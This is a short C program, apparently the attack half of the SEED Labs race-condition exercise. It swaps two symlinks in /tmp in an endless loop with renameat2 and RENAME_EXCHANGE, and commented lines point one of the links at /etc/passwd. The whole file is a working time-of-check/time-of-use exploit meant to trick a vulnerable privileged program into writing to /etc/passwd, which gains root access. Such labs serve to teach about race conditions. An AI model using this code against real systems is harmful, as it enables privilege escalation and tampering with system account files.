#include<unistd.h>
#include<sys/syscall.h>
#include<linux/fs.h>

int main()
{
	// symlink("home/seed/myfile","/tmp/XYZ");
	// symlink("/etc/passwd","/tmp/ABC");
	while(1)
	{	
		syscall(SYS_renameat2, 0, "/tmp/ABC", 0, "/tmp/XYZ", RENAME_EXCHANGE);
	}
	return(0);
}

